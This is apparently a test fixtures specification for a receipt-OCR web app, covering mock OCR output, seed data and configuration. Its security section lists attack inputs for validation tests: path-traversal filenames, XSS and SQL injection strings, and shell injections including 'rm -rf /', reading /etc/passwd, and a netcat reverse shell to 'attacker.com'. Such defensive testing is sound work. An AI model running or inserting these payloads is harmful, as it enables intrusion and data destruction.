# Test Fixtures Specification

## Overview

This document specifies all test fixtures, mock data, and test resources needed for the receipt image processing feature tests.

---

## 1. Sample Receipt Images

### Location: `/tests/fixtures/receipts/`

| Filename | Type | Size | Resolution | Description | Use Cases |
|----------|------|------|------------|-------------|-----------|
| `grocery-clean.jpg` | JPEG | ~500KB | 1200x1800 | Perfect quality grocery receipt | Happy path, baseline |
| `grocery-blurry.jpg` | JPEG | ~400KB | 1200x1800 | Slightly blurred receipt (motion blur) | OCR resilience |
| `grocery-rotated-90.jpg` | JPEG | ~500KB | 1800x1200 | Rotated 90° clockwise | Rotation handling |
| `grocery-rotated-180.jpg` | JPEG | ~500KB | 1200x1800 | Upside down | Rotation handling |
| `restaurant-receipt.jpg` | JPEG | ~350KB | 800x1400 | Restaurant bill with tip line | Format variation |
| `hardware-store.jpg` | JPEG | ~450KB | 1200x1600 | Home improvement store receipt | Format variation |
| `receipt-partial.jpg` | JPEG | ~300KB | 1200x900 | Torn/cropped receipt (bottom missing) | Edge case |
| `receipt-faded.jpg` | JPEG | ~250KB | 1200x1800 | Faded thermal paper | Edge case |
| `receipt-handwritten.jpg` | JPEG | ~400KB | 1200x1600 | Handwritten receipt | Edge case |
| `receipt-empty.jpg` | JPEG | ~200KB | 1200x1800 | Blank white paper | Error handling |
| `receipt-large-5mb.jpg` | JPEG | 5MB | 4000x6000 | High resolution image | Performance testing |
| `receipt-multiple.jpg` | JPEG | ~800KB | 2400x1800 | Two receipts side by side | Edge case |
| `receipt-corrupted.jpg` | JPEG | ~50KB | N/A | Corrupted/truncated file | Error handling |
| `non-receipt.jpg` | JPEG | ~300KB | 1200x1200 | Random document/photo | OCR handles non-receipt |

### Image Generation Script

```bash
# Script to generate test receipt images
# Location: /tests/fixtures/receipts/generate-receipts.sh

#!/bin/bash

# Create directory
mkdir -p tests/fixtures/receipts

# Note: These are placeholder commands
# Actual receipt images should be photographed or scanned from real receipts
# with PII redacted for privacy

# Example: Create blank receipt for testing
convert -size 1200x1800 xc:white tests/fixtures/receipts/receipt-empty.jpg

# Example: Rotate existing receipt
convert grocery-clean.jpg -rotate 90 grocery-rotated-90.jpg

# Example: Add blur
convert grocery-clean.jpg -blur 0x2 grocery-blurry.jpg

# Example: Reduce quality for faded effect
convert grocery-clean.jpg -quality 30 -colorspace Gray receipt-faded.jpg
```

---

## 2. Mock OCR Output

### Location: `/tests/fixtures/ocr-output/`

### 2.1 Grocery Store Receipt

**File:** `grocery-clean.json`

```json
{
  "text": "WALMART SUPERCENTER\n123 MAIN STREET\nANYTOWN, ST 12345\nPhone: (555) 123-4567\n\nCashier: JOHN D.\nRegister: 5\nDate: 10/15/2025  Time: 14:32:15\n\nMILK 2% GALLON          $4.99\nBREAD WHOLE WHEAT       $2.49\nEGGS LARGE 12CT         $3.99\nAPPLES FUJI LB @ $1.99  $1.99\nBANANAS LB @ $0.59      $1.18\nCHEESE CHEDDAR 8OZ      $3.99\nCHICKEN BREAST LB       $8.99\nRICE 5LB BAG            $6.99\n\nSUBTOTAL               $34.61\nTAX (7.5%)              $2.60\nTOTAL                  $37.21\n\nCASH TENDERED          $40.00\nCHANGE                  $2.79\n\nITEMS SOLD: 8\nTHANK YOU FOR SHOPPING!\nSAVE YOUR RECEIPT",
  "confidence": 94.5,
  "lines": [
    { "text": "WALMART SUPERCENTER", "confidence": 98.2, "bbox": [100, 50, 1100, 120] },
    { "text": "MILK 2% GALLON          $4.99", "confidence": 96.1, "bbox": [50, 400, 1150, 450] }
  ]
}
```

### 2.2 Restaurant Receipt

**File:** `restaurant-receipt.json`

```json
{
  "text": "THE ITALIAN BISTRO\n456 OAK AVENUE\nCITYNAME, ST 54321\nTel: 555-987-6543\n\nTable: 12    Server: Maria\nGuests: 2    Date: 10/15/2025\nTime: 19:45\n\nCaesar Salad            $8.99\nMargherita Pizza       $14.99\nSpaghetti Carbonara    $12.99\nTiramisu                $6.99\nIced Tea (2)            $4.98\n\nSubtotal               $48.94\nTax                     $3.92\nTotal                  $52.86\n\nSuggested Tip:\n15%: $7.93\n18%: $9.51\n20%: $10.57\n\nThank you! Please come again!",
  "confidence": 91.3,
  "lines": []
}
```

### 2.3 Hardware Store Receipt

**File:** `hardware-store.json`

```json
{
  "text": "HOME DEPOT #1234\n789 INDUSTRIAL BLVD\nTOWNVILLE, ST 98765\n\nDate: 10/15/2025  Time: 10:23 AM\nCashier: Bob S.  Register: 3\n\n(1) HAMMER 16OZ          $19.99\n(5) NAILS 1LB BOX        $24.95\n    @ $4.99 ea\n(1) SCREWDRIVER SET      $34.99\n(2) PAINT GALLON WHT     $59.98\n    @ $29.99 ea\n(1) PAINTBRUSH 3\"        $8.99\n(1) TAPE MEASURE 25FT    $12.99\n\nSUBTOTAL               $161.89\nSALES TAX (8.0%)        $12.95\nTOTAL                  $174.84\n\nVISA ****1234          $174.84\n\nYOU SAVED: $23.50 TODAY!\nREWARDS EARNED: 174 pts",
  "confidence": 93.8,
  "lines": []
}
```

### 2.4 Empty/Failed OCR

**File:** `ocr-empty.json`

```json
{
  "text": "",
  "confidence": 0,
  "lines": [],
  "error": null
}
```

### 2.5 Partial/Corrupted OCR

**File:** `ocr-partial.json`

```json
{
  "text": "STORE NAME\n[UNREADABLE]\n\nMILK      $4.99\nBREAD     $[UNREADABLE]\nEGGS      $3.99\n\nSUB[UNREADABLE]\nTAX\nTOTAL     $14.54",
  "confidence": 45.2,
  "lines": []
}
```

---

## 3. Expected Parsed Data

### Location: `/tests/fixtures/parsed-data/`

### 3.1 Grocery Store - Expected Output

**File:** `grocery-clean-expected.json`

```json
{
  "store": {
    "name": "Walmart Supercenter",
    "address": "123 Main Street, Anytown, ST 12345",
    "phone": "(555) 123-4567"
  },
  "transaction": {
    "date": "2025-10-15T14:32:15.000Z",
    "cashier": "John D.",
    "register": "5"
  },
  "items": [
    {
      "name": "Milk 2% Gallon",
      "price": 4.99,
      "quantity": 1,
      "unit": null,
      "category": "Groceries",
      "suggestedCategory": "Dairy"
    },
    {
      "name": "Bread Whole Wheat",
      "price": 2.49,
      "quantity": 1,
      "unit": null,
      "category": "Groceries",
      "suggestedCategory": "Bakery"
    },
    {
      "name": "Eggs Large 12ct",
      "price": 3.99,
      "quantity": 1,
      "unit": null,
      "category": "Groceries",
      "suggestedCategory": "Dairy"
    },
    {
      "name": "Apples Fuji",
      "price": 1.99,
      "quantity": 1,
      "unit": "lb",
      "unitPrice": 1.99,
      "category": "Groceries",
      "suggestedCategory": "Produce"
    },
    {
      "name": "Bananas",
      "price": 1.18,
      "quantity": 2,
      "unit": "lb",
      "unitPrice": 0.59,
      "category": "Groceries",
      "suggestedCategory": "Produce"
    },
    {
      "name": "Cheese Cheddar 8oz",
      "price": 3.99,
      "quantity": 1,
      "unit": null,
      "category": "Groceries",
      "suggestedCategory": "Dairy"
    },
    {
      "name": "Chicken Breast",
      "price": 8.99,
      "quantity": 1,
      "unit": "lb",
      "category": "Groceries",
      "suggestedCategory": "Meat"
    },
    {
      "name": "Rice 5lb Bag",
      "price": 6.99,
      "quantity": 1,
      "unit": null,
      "category": "Groceries",
      "suggestedCategory": "Pantry"
    }
  ],
  "summary": {
    "subtotal": 34.61,
    "tax": 2.60,
    "taxRate": 0.075,
    "total": 37.21,
    "itemCount": 8,
    "paymentMethod": "cash",
    "amountTendered": 40.00,
    "change": 2.79
  },
  "rawText": "[full OCR text here]",
  "confidence": 94.5,
  "parsingWarnings": []
}
```

### 3.2 Restaurant - Expected Output

**File:** `restaurant-receipt-expected.json`

```json
{
  "store": {
    "name": "The Italian Bistro",
    "address": "456 Oak Avenue, Cityname, ST 54321",
    "phone": "555-987-6543"
  },
  "transaction": {
    "date": "2025-10-15T19:45:00.000Z",
    "server": "Maria",
    "table": "12",
    "guests": 2
  },
  "items": [
    {
      "name": "Caesar Salad",
      "price": 8.99,
      "quantity": 1,
      "category": "Groceries",
      "suggestedCategory": "Restaurant"
    },
    {
      "name": "Margherita Pizza",
      "price": 14.99,
      "quantity": 1,
      "category": "Groceries",
      "suggestedCategory": "Restaurant"
    },
    {
      "name": "Spaghetti Carbonara",
      "price": 12.99,
      "quantity": 1,
      "category": "Groceries",
      "suggestedCategory": "Restaurant"
    },
    {
      "name": "Tiramisu",
      "price": 6.99,
      "quantity": 1,
      "category": "Groceries",
      "suggestedCategory": "Restaurant"
    },
    {
      "name": "Iced Tea",
      "price": 4.98,
      "quantity": 2,
      "unitPrice": 2.49,
      "category": "Groceries",
      "suggestedCategory": "Restaurant"
    }
  ],
  "summary": {
    "subtotal": 48.94,
    "tax": 3.92,
    "taxRate": 0.08,
    "total": 52.86,
    "itemCount": 5,
    "suggestedTip": {
      "15percent": 7.93,
      "18percent": 9.51,
      "20percent": 10.57
    }
  },
  "rawText": "[full OCR text here]",
  "confidence": 91.3,
  "parsingWarnings": []
}
```

### 3.3 Edge Cases - Expected Output

**File:** `edge-cases-expected.json`

```json
{
  "emptyReceipt": {
    "items": [],
    "summary": {
      "total": 0,
      "itemCount": 0
    },
    "parsingWarnings": ["No items found in receipt"]
  },
  "partialReceipt": {
    "items": [
      {
        "name": "Milk",
        "price": 4.99,
        "quantity": 1
      },
      {
        "name": "Eggs",
        "price": 3.99,
        "quantity": 1
      }
    ],
    "summary": {
      "total": 14.54,
      "itemCount": 2
    },
    "parsingWarnings": [
      "Could not read subtotal",
      "One or more items may be missing due to OCR quality"
    ]
  },
  "noDate": {
    "transaction": {
      "date": "2025-10-15T00:00:00.000Z"
    },
    "parsingWarnings": ["No date found, using current date"]
  }
}
```

---

## 4. Database Seed Data

### Location: `/tests/fixtures/db/`

### 4.1 Test Categories

**File:** `test-categories.json`

```json
[
  {
    "id": "cat-groceries",
    "name": "Groceries",
    "description": "Food and household items",
    "icon": "shopping-cart",
    "color": "#10b981",
    "minQuantity": 0
  },
  {
    "id": "cat-electronics",
    "name": "Electronics",
    "description": "Electronic devices and accessories",
    "icon": "laptop",
    "color": "#3b82f6",
    "minQuantity": 0
  },
  {
    "id": "cat-home-garden",
    "name": "Home & Garden",
    "description": "Home improvement and gardening items",
    "icon": "home",
    "color": "#f59e0b",
    "minQuantity": 0
  },
  {
    "id": "cat-clothing",
    "name": "Clothing",
    "description": "Apparel and accessories",
    "icon": "shirt",
    "color": "#ec4899",
    "minQuantity": 0
  },
  {
    "id": "cat-health-beauty",
    "name": "Health & Beauty",
    "description": "Health and personal care products",
    "icon": "heart",
    "color": "#8b5cf6",
    "minQuantity": 0
  }
]
```

### 4.2 Test Locations

**File:** `test-locations.json`

```json
[
  {
    "id": "loc-kitchen",
    "name": "Kitchen",
    "description": "Kitchen and dining area",
    "parentId": null
  },
  {
    "id": "loc-pantry",
    "name": "Pantry",
    "description": "Food storage",
    "parentId": "loc-kitchen"
  },
  {
    "id": "loc-fridge",
    "name": "Refrigerator",
    "description": "Cold storage",
    "parentId": "loc-kitchen"
  },
  {
    "id": "loc-garage",
    "name": "Garage",
    "description": "Garage storage",
    "parentId": null
  },
  {
    "id": "loc-garage-shelf",
    "name": "Garage Shelf",
    "description": "Storage shelves in garage",
    "parentId": "loc-garage"
  },
  {
    "id": "loc-bedroom",
    "name": "Bedroom",
    "description": "Master bedroom",
    "parentId": null
  },
  {
    "id": "loc-closet",
    "name": "Closet",
    "description": "Bedroom closet",
    "parentId": "loc-bedroom"
  }
]
```

### 4.3 Test Users

**File:** `test-users.json`

```json
[
  {
    "id": "user-test-001",
    "email": "test@example.com",
    "password": "$2a$10$YourHashedPasswordHere",
    "name": "Test User",
    "role": "USER",
    "emailVerified": "2025-01-01T00:00:00.000Z"
  },
  {
    "id": "user-test-002",
    "email": "test2@example.com",
    "password": "$2a$10$AnotherHashedPasswordHere",
    "name": "Test User 2",
    "role": "USER",
    "emailVerified": "2025-01-01T00:00:00.000Z"
  },
  {
    "id": "user-admin-001",
    "email": "admin@example.com",
    "password": "$2a$10$AdminHashedPasswordHere",
    "name": "Admin User",
    "role": "ADMIN",
    "emailVerified": "2025-01-01T00:00:00.000Z"
  }
]
```

### 4.4 Database Seed Script

**File:** `seed-test-data.ts`

```typescript
import { PrismaClient } from '@prisma/client';
import fs from 'fs/promises';
import path from 'path';

const prisma = new PrismaClient();

async function seedTestData() {
  // Clear existing test data
  await prisma.item.deleteMany({});
  await prisma.itemTag.deleteMany({});
  await prisma.tag.deleteMany({});
  await prisma.category.deleteMany({});
  await prisma.location.deleteMany({});
  await prisma.session.deleteMany({});
  await prisma.user.deleteMany({});

  // Load fixture data
  const categoriesData = JSON.parse(
    await fs.readFile(path.join(__dirname, 'test-categories.json'), 'utf-8')
  );
  const locationsData = JSON.parse(
    await fs.readFile(path.join(__dirname, 'test-locations.json'), 'utf-8')
  );
  const usersData = JSON.parse(
    await fs.readFile(path.join(__dirname, 'test-users.json'), 'utf-8')
  );

  // Seed categories
  for (const category of categoriesData) {
    await prisma.category.create({ data: category });
  }

  // Seed locations (handle parent relationships)
  const rootLocations = locationsData.filter((loc: any) => !loc.parentId);
  for (const location of rootLocations) {
    await prisma.location.create({ data: location });
  }

  const childLocations = locationsData.filter((loc: any) => loc.parentId);
  for (const location of childLocations) {
    await prisma.location.create({ data: location });
  }

  // Seed users
  for (const user of usersData) {
    await prisma.user.create({ data: user });
  }

  console.log('✅ Test data seeded successfully');
}

seedTestData()
  .catch((e) => {
    console.error('❌ Error seeding test data:', e);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });
```

---

## 5. Security Test Fixtures

### Location: `/tests/fixtures/security/`

### 5.1 Malicious Files

**File:** `malicious-files.json`

```json
{
  "executable": {
    "filename": "virus.exe",
    "mimeType": "application/x-msdownload",
    "content": "MZ binary header..."
  },
  "pathTraversal": {
    "filename": "../../etc/passwd.jpg",
    "expectedSanitized": "passwd.jpg"
  },
  "doubleExtension": {
    "filename": "receipt.jpg.exe",
    "mimeType": "image/jpeg",
    "expectedRejection": true
  },
  "mimeTypeSpoofing": {
    "filename": "malware.jpg",
    "actualMimeType": "application/x-msdownload",
    "claimedMimeType": "image/jpeg"
  }
}
```

### 5.2 Injection Payloads

**File:** `injection-payloads.json`

```json
{
  "xss": [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg onload=alert('XSS')>",
    "';alert(String.fromCharCode(88,83,83))//'"
  ],
  "sql": [
    "'; DROP TABLE items; --",
    "' OR '1'='1",
    "admin'--",
    "' UNION SELECT * FROM users--",
    "1; DELETE FROM items WHERE 1=1--"
  ],
  "command": [
    "; rm -rf /",
    "| cat /etc/passwd",
    "`whoami`",
    "$(curl malicious.com)",
    "&& nc -e /bin/bash attacker.com 4444"
  ],
  "nosql": [
    "{\"$ne\": null}",
    "{\"$gt\": \"\"}",
    "{\"$where\": \"sleep(1000)\"}"
  ]
}
```

---

## 6. Environment Configuration

### 6.1 Test Environment Variables

**File:** `.env.test`

```bash
# Database
DATABASE_URL="file:./test.db"
TEST_DATABASE_URL="file:./test.db"

# NextAuth
NEXTAUTH_URL="http://localhost:3000"
NEXTAUTH_SECRET="test-secret-key-min-32-characters-long"

# Test Users
TEST_USER_EMAIL="test@example.com"
TEST_USER_PASSWORD="TestPassword123!"
TEST_ADMIN_EMAIL="admin@example.com"
TEST_ADMIN_PASSWORD="AdminPassword123!"

# Feature Flags
ENABLE_RECEIPT_PROCESSING=true
MAX_RECEIPT_SIZE_MB=5
ALLOWED_IMAGE_TYPES="image/jpeg,image/png,image/webp"

# OCR Configuration
TESSERACT_LANG="eng"
OCR_TIMEOUT_MS=30000
OCR_WORKER_POOL_SIZE=2

# Performance
VITEST_POOL_ID=1
NODE_OPTIONS="--max-old-space-size=4096"
```

### 6.2 Playwright Test Configuration

**File:** `playwright.config.test.ts`

```typescript
import { defineConfig } from '@playwright/test';

export default defineConfig({
  testDir: './tests/e2e',
  fullyParallel: false, // Sequential for test isolation
  workers: 1,
  retries: 0,
  reporter: [['html', { open: 'never' }]],

  use: {
    baseURL: 'http://localhost:3000',
    trace: 'retain-on-failure',
    screenshot: 'only-on-failure',
    video: 'retain-on-failure',
  },

  projects: [
    {
      name: 'setup',
      testMatch: /.*\.setup\.ts/,
    },
    {
      name: 'chromium',
      use: {
        ...devices['Desktop Chrome'],
        storageState: 'tests/fixtures/auth/user.json',
      },
      dependencies: ['setup'],
    },
  ],

  webServer: {
    command: 'npm run dev',
    url: 'http://localhost:3000',
    reuseExistingServer: false,
    timeout: 120000,
    env: {
      ...process.env,
      DATABASE_URL: 'file:./test.db',
    },
  },
});
```

---

## 7. Mock Service Worker (MSW) Handlers

### Location: `/tests/mocks/`

**File:** `handlers.ts`

```typescript
import { http, HttpResponse } from 'msw';

export const handlers = [
  // Mock successful receipt upload
  http.post('/api/receipts/upload', async ({ request }) => {
    const formData = await request.formData();
    const file = formData.get('receipt');

    if (!file || !(file instanceof File)) {
      return HttpResponse.json(
        { error: 'No file provided' },
        { status: 400 }
      );
    }

    if (!file.type.startsWith('image/')) {
      return HttpResponse.json(
        { error: 'Invalid file type' },
        { status: 400 }
      );
    }

    return HttpResponse.json({
      receiptId: 'receipt-mock-123',
      imageUrl: '/uploads/mock-receipt.jpg',
      status: 'uploaded',
    }, { status: 201 });
  }),

  // Mock OCR processing
  http.post('/api/receipts/:id/process', async ({ params }) => {
    const { id } = params;

    // Simulate processing delay
    await new Promise(resolve => setTimeout(resolve, 1000));

    return HttpResponse.json({
      receiptId: id,
      items: [
        { name: 'Mock Item 1', price: 9.99, quantity: 1 },
        { name: 'Mock Item 2', price: 14.99, quantity: 2 },
      ],
      total: 39.97,
      status: 'processed',
    });
  }),

  // Mock network failure
  http.post('/api/receipts/upload/fail', () => {
    return HttpResponse.error();
  }),
];
```

---

## 8. Fixture Generation Scripts

### 8.1 Generate Test Database

**File:** `scripts/generate-test-db.sh`

```bash
#!/bin/bash

echo "🗄️  Generating test database..."

# Set test environment
export DATABASE_URL="file:./tests/test.db"

# Remove existing test database
rm -f tests/test.db

# Run migrations
npx prisma migrate deploy

# Seed test data
tsx tests/fixtures/db/seed-test-data.ts

echo "✅ Test database generated successfully"
```

### 8.2 Validate Fixtures

**File:** `scripts/validate-fixtures.ts`

```typescript
import fs from 'fs/promises';
import path from 'path';

async function validateFixtures() {
  const fixturesDir = path.join(__dirname, '../tests/fixtures');
  const requiredDirs = ['receipts', 'ocr-output', 'parsed-data', 'db', 'security'];
  const requiredFiles = [
    'receipts/grocery-clean.jpg',
    'ocr-output/grocery-clean.json',
    'parsed-data/grocery-clean-expected.json',
    'db/test-categories.json',
    'db/test-locations.json',
    'db/test-users.json',
  ];

  console.log('🔍 Validating test fixtures...\n');

  // Check directories
  for (const dir of requiredDirs) {
    const dirPath = path.join(fixturesDir, dir);
    try {
      await fs.access(dirPath);
      console.log(`✅ Directory exists: ${dir}`);
    } catch {
      console.error(`❌ Missing directory: ${dir}`);
      process.exit(1);
    }
  }

  // Check required files
  for (const file of requiredFiles) {
    const filePath = path.join(fixturesDir, file);
    try {
      await fs.access(filePath);
      const stats = await fs.stat(filePath);
      console.log(`✅ File exists: ${file} (${stats.size} bytes)`);
    } catch {
      console.error(`❌ Missing file: ${file}`);
      process.exit(1);
    }
  }

  console.log('\n✅ All fixtures validated successfully');
}

validateFixtures();
```

---

## 9. Usage Instructions

### 9.1 Setup Fixtures

```bash
# 1. Create fixture directories
mkdir -p tests/fixtures/{receipts,ocr-output,parsed-data,db,security,auth}

# 2. Generate/copy test receipt images
# (Manually photograph receipts or use provided samples)

# 3. Generate test database
./scripts/generate-test-db.sh

# 4. Validate all fixtures
tsx scripts/validate-fixtures.ts
```

### 9.2 Using Fixtures in Tests

```typescript
import fs from 'fs/promises';
import path from 'path';

// Load receipt image
const receiptPath = path.join(__dirname, '../fixtures/receipts/grocery-clean.jpg');
const receiptBuffer = await fs.readFile(receiptPath);

// Load expected OCR output
const ocrOutputPath = path.join(__dirname, '../fixtures/ocr-output/grocery-clean.json');
const ocrOutput = JSON.parse(await fs.readFile(ocrOutputPath, 'utf-8'));

// Load expected parsed data
const expectedPath = path.join(__dirname, '../fixtures/parsed-data/grocery-clean-expected.json');
const expected = JSON.parse(await fs.readFile(expectedPath, 'utf-8'));
```

---

## 10. Maintenance

### 10.1 Adding New Fixtures

1. Add image to `/tests/fixtures/receipts/`
2. Generate OCR output (or manually create JSON)
3. Create expected parsed data JSON
4. Update this documentation
5. Run validation script
6. Commit to repository (ensure PII is redacted)

### 10.2 Updating Fixtures

- Review fixtures quarterly for relevance
- Update expected outputs when parser logic changes
- Add new edge cases as discovered
- Maintain fixture size balance (don't over-bloat repository)

---

**Document Version:** 1.0
**Last Updated:** 2025-10-15
**Status:** Ready for Implementation
